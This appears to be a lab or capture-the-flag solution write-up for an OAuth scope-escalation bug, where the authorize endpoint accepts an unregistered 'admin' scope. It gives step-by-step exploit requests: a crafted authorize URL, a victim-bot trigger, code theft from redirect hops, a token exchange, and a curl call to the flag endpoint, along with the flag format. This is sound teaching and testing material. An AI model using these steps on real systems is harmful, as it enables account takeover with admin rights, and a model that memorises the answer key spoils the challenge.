# oauth/scope-creep — ScopeCreep (identity-gated, medium)

**DataDeck** analytics portal + mini-AS ("DeckID"). The client is registered for scope `read` only; `admin` is a server-side-only scope that should never be delegated.
**Bug:** `/oauth/authorize` stores the requested `scope` verbatim — there is no allowlist against the client's registered scopes. Anyone can craft an authorize link with `scope=read admin` and it will be honored for whoever completes it.

## Intended path
1. Craft the authorize URL with the over-broad scope:
   `http://victim.target.lab:8119/oauth/authorize?client_id=web&redirect_uri=http%3A%2F%2Fvictim.target.lab%3A8119%2Foauth%2Fcallback&response_type=code&scope=read%20admin&state=x`
2. Drive the victim through it: `POST http://collector.target.lab:8119/victim` with `{"url":"<that URL>","sso":true}` — the bot holds the innocent's AS session, so the issued code carries `sub=<innocent>` and `scope=read admin`; the bot lands on the callback confirmation page (the code is **not** consumed there).
3. Read the `code` from the bot's `hops` (callback URL query).
4. Exchange it: `POST /oauth/token` `{"code":"<code>"}` → `access_token` with `scope=read admin` and `sub=<innocent>`.
5. `curl -H "Authorization: Bearer <token>" http://victim.target.lab:8119/flag` — gate: token `sub` = innocent **and** scope contains `admin` (both checked server-side).

**Flag:** `DSLTV{OAUTH-ScopeCreep-<9 digits>}` (only from `/flag`).
